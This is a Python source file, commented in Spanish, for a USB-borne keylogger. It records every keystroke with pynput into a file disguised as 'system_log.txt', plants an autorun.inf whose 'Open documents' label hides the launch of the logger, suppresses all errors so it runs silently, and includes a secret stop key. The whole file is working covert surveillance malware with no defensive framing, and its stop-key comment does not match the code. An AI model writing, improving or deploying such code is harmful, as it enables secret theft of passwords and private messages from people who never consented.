import os
import time
import threading
from pynput import keyboard
from pynput.keyboard import Listener, Key
import sys

class USBKeylogger:
    def __init__(self):
        # Obtener la ruta del USB automáticamente
        self.usb_path = self.get_usb_path()
        self.log_file = os.path.join(self.usb_path, "system_log.txt")
        self.is_caps = False
        self.is_shift = False
        
    def get_usb_path(self):
        """Detecta automáticamente la ruta del USB"""
        if os.name == 'nt':  # Windows
            import string
            drives = []
            for drive in string.ascii_uppercase:
                drive_path = f"{drive}:\\"
                if os.path.exists(drive_path):
                    drives.append(drive_path)
            # Asumimos que el USB es la última unidad conectada
            return drives[-1] if drives else "C:\\"
        else:  # Linux/Mac
            return "/media/" + os.listdir("/media")[-1] if os.path.exists("/media") else "/tmp"
    
    def log_key(self, key):
        """Registra las teclas presionadas"""
        try:
            current_time = time.strftime("%Y-%m-%d %H:%M:%S")
            
            # Manejo de teclas especiales
            if key == Key.space:
                key_data = " "
            elif key == Key.enter:
                key_data = "\n"
            elif key == Key.tab:
                key_data = "\t"
            elif key == Key.backspace:
                key_data = " [BACKSPACE] "
            elif key == Key.shift or key == Key.shift_r:
                self.is_shift = True
                return
            elif key == Key.caps_lock:
                self.is_caps = not self.is_caps
                return
            else:
                # Convertir tecla a caracter
                key_data = self.get_char(key)
            
            # Escribir en el archivo
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(key_data)
                
        except Exception as e:
            pass
    
    def get_char(self, key):
        """Convierte la tecla a caracter considerando Shift y CapsLock"""
        try:
            char = key.char
            if char:
                if self.is_shift ^ self.is_caps:
                    return char.upper()
                else:
                    return char.lower()
        except AttributeError:
            # Para teclas especiales
            special_keys = {
                Key.esc: " [ESC] ",
                Key.delete: " [DEL] ",
                Key.up: " [UP] ",
                Key.down: " [DOWN] ",
                Key.left: " [LEFT] ",
                Key.right: " [RIGHT] ",
            }
            return special_keys.get(key, f" [{str(key).replace('Key.', '')}] ")
        return ""
    
    def on_press(self, key):
        """Callback cuando se presiona una tecla"""
        self.log_key(key)
    
    def on_release(self, key):
        """Callback cuando se suelta una tecla"""
        if key == Key.shift or key == Key.shift_r:
            self.is_shift = False
        
        # Comando secreto para detener (Ctrl+Alt+K)
        if key == keyboard.KeyCode.from_char('k') and self.is_shift:
            return False
    
    def start_logging(self):
        """Inicia el keylogger"""
        # Crear archivo de log inicial
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(f"\n\n=== Session Started: {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
        
        # Iniciar listener
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

def create_autorun():
    """Crea archivo autorun.inf (solo Windows)"""
    if os.name == 'nt':
        autorun_content = """[AutoRun]
open=keylogger.py
action=Open documents
shell\\open\\command=keylogger.py
"""
        usb_path = USBKeylogger().get_usb_path()
        with open(os.path.join(usb_path, "autorun.inf"), "w") as f:
            f.write(autorun_content)

if __name__ == "__main__":
    # Ejecutar silenciosamente
    try:
        create_autorun()
        logger = USBKeylogger()
        logger.start_logging()
    except Exception:
        pass